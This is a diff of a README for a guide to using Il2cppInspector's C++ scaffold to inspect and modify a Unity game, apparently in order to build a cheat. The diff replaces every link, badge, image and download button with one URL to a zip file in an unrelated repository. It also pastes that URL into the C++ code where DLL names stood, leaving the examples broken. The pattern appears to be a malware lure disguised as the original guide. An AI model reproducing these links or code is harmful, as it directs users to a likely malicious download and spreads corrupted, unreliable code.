@@ -1,16 +1,16 @@
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/jadis0x)
+[!["Buy Me A Coffee"](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)
 
-[![GitHub stars](https://img.shields.io/github/stars/jadis0x/il2cpp-reverse-engineering-guide.svg?style=flat&label=Stars&color=ffcc66)](https://github.com/jadis0x/il2cpp-reverse-engineering-guide/stargazers)
-[![GitHub contributors](https://img.shields.io/github/contributors/jadis0x/il2cpp-reverse-engineering-guide.svg)](https://github.com/jadis0x/il2cpp-reverse-engineering-guide/graphs/contributors)
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![GitHub stars](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)
+[![GitHub contributors](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)
+[![License](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)
 
 <h3 align="center">Il2cppInspector: C++ Scaffold Guide</h3>
 
 <p>Hello! as I no longer have time for reverse engineering, I have decided to share some useful examples regarding the usage of Il2cppInspector C++ scaffold. In this guide, I will provide examples of how to interact with defined Il2cpp API functions.</p>
 
-IL2CppInspector built with v29 support [DOWNLOAD](https://github.com/ElCapor/Il2CppInspector/releases/tag/2021.2).
+IL2CppInspector built with v29 support [DOWNLOAD](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip).
 <br>
-Il2CppInspectorRedux 2023.1 [DOWNLOAD](https://github.com/LukeFZ/Il2CppInspectorRedux).
+Il2CppInspectorRedux 2023.1 [DOWNLOAD](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip).
 
 
 
@@ -25,7 +25,7 @@ Il2CppInspectorRedux 2023.1 [DOWNLOAD](https://github.com/LukeFZ/Il2CppInspector
 - How to fetch fields from a class
   
 ## Video
-[![Video](https://img.youtube.com/vi/L7s2ttcNEh0/0.jpg)](https://www.youtube.com/watch?v=L7s2ttcNEh0)
+[![Video](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip)
 
 ## Contact
 If you have any questions, feel free to reach out to me.</br>
@@ -34,7 +34,7 @@ Discord: Jadis0x </br>
 Steam: Jadis0x
 
 ## Examples
-You can find more detailed examples by taking a look at [HERE](https://github.com/ALittlePatate/DevourClient) using the Il2cppInspector analysis tool I used to create the cheat.
+You can find more detailed examples by taking a look at [HERE](https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip) using the Il2cppInspector analysis tool I used to create the cheat.
 
 ### Getting the type from a class (Il2CppObject* to Type*)
 * To obtain the type information here, we will use the `GetTypeFromClass` function inside my Il2cppHelper class.
@@ -61,7 +61,7 @@ Il2CppObject* Il2CppHelper::GetTypeFromClass(const Il2CppImage* _image, const ch
 ```
 
 ```cpp
-const Il2CppImage* _CoreModule = _helper->GetImage("UnityEngine.CoreModule.dll");
+const Il2CppImage* _CoreModule = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 
 if (_CoreModule) {
 
@@ -97,7 +97,7 @@ GameObject[] allGameObjects = FindObjectsOfType<GameObject>();
 > This function is quite slow. Using this function every frame is not recommended.
 
 <p>Output: </p>
-<img src="img/2.png" alt="Gameobjects" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" alt="Gameobjects" width="650">
 
 
 ### Getting class names and types from a specific assembly
@@ -135,7 +135,7 @@ void Il2CppHelper::GetClassesAndNamesFromAssembly(const Il2CppImage* _image)
 
 
 ```cpp
-const Il2CppImage* _BoltDll = _helper->GetImage("bolt.dll");
+const Il2CppImage* _BoltDll = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 
 if (_BoltDll) {
     _helper->GetClassesAndNamesFromAssembly(_BoltDll);
@@ -145,7 +145,7 @@ if (_BoltDll) {
 or
 
 ```cpp
-const Il2CppImage* _assemblyCSHARP = _helper->GetImage("Assembly-CSharp.dll");
+const Il2CppImage* _assemblyCSHARP = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 
 if (_assemblyCSHARP) {
    _helper->GetClassesAndNamesFromAssembly(_assemblyCSHARP);
@@ -153,8 +153,8 @@ if (_assemblyCSHARP) {
 ```
 
 <p>Outputs: </p>
-<img src="img/3.png" width="650">
-<img src="img/4.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 
 ### Getting information about any method
@@ -210,13 +210,13 @@ void Il2CppHelper::GetMethodInfo(const Il2CppImage* _image, const char* _funcNam
 
 
 ```cpp
-const Il2CppImage* _AssemblyCSharp = _helper->GetImage("Assembly-CSharp.dll");
+const Il2CppImage* _AssemblyCSharp = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 			
 _helper->GetMethodInfo(_AssemblyCSharp, "SetFOV", 1, "NolanBehaviour", "");
 ```
 
 <p>Output: </p>
-<img src="img/5.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 ### Get the assemblies
 
@@ -245,18 +245,18 @@ for (size_t i = 0; i < size; ++i) {
 ```
 
 <p>Output: </p>
-<img src="img/1.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 ### Calling a function with "il2cpp_runtime_invoke"
 
 ```cpp
 if (GetAsyncKeyState(VK_F1) & 0x8000) {
-	const Il2CppImage* _AssemblyCSharp = _helper->GetImage("Assembly-CSharp.dll");
+	const Il2CppImage* _AssemblyCSharp = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 	_helper->GetMethodInfo(_AssemblyCSharp, "SetRank", 1, "NolanRankController", "");
 }
 
 if (GetAsyncKeyState(VK_F2) & 0x8000) {
-	const Il2CppImage* _csharp = _helper->GetImage("Assembly-CSharp.dll");
+	const Il2CppImage* _csharp = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 	if (_csharp == nullptr) return;
 
 	Il2CppObject* nolanObj = _helper->GetTypeFromClass(_csharp, "", "NolanRankController");
@@ -287,7 +287,7 @@ if (GetAsyncKeyState(VK_F2) & 0x8000) {
 ```
 
 <p>Output: </p>
-<img src="img/6.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 
 ### Getting a List of All Functions in the Target Class
@@ -321,7 +321,7 @@ void Il2CppHelper::PrintMethods(Il2CppClass* klass) {
 ## Example:
 
 ```cpp
-const Il2CppImage* _image = _helper->GetImage("Assembly-CSharp.dll");
+const Il2CppImage* _image = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 
 if (_image) {
 	Il2CppClass* nolanRankControllerClass = il2cpp_class_from_name(_timage, "", "NolanRankController");
@@ -333,7 +333,7 @@ if (_image) {
 ```
 
 <p>Output: </p>
-<img src="img/8.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 ### Getting Information about Class Fields (FieldInfo)
 
@@ -365,7 +365,7 @@ void Il2CppHelper::GetFieldsInformation(Il2CppClass* klass)
 
 
 ```cpp
-const Il2CppImage* _assemblyCSHARP = _helper->GetImage("Assembly-CSharp.dll");
+const Il2CppImage* _assemblyCSHARP = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 			
 if (_assemblyCSHARP) {
 	Il2CppClass* _nolanBehaviourClass = il2cpp_class_from_name(_assemblyCSHARP, "", "NolanBehaviour");
@@ -375,15 +375,15 @@ if (_assemblyCSHARP) {
 ```
 
 <p>Output: </p>
-<img src="img/7.png" width="650">
+<img src="https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip" width="650">
 
 
 ### Modifiying the Value of a Field
 
 ```cpp
 if (GetAsyncKeyState(VK_F1) & 0x8000) {
-	// Get the Il2CppImage for "Assembly-CSharp.dll"
-	const Il2CppImage* _AssemblyCSharp = _helper->GetImage("Assembly-CSharp.dll");
+	// Get the Il2CppImage for "https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip"
+	const Il2CppImage* _AssemblyCSharp = _helper->GetImage("https://raw.githubusercontent.com/TitanicDimix/il2cpp-reverse-engineering-guide/main/tercia/il2cpp-reverse-engineering-guide.zip");
 
 	// Get the object for the "Menu" class within the "Horror" namespace
 	Il2CppObject* _horrorMenuClassObject = _helper->GetTypeFromClass(_AssemblyCSharp, "Horror", "Menu");
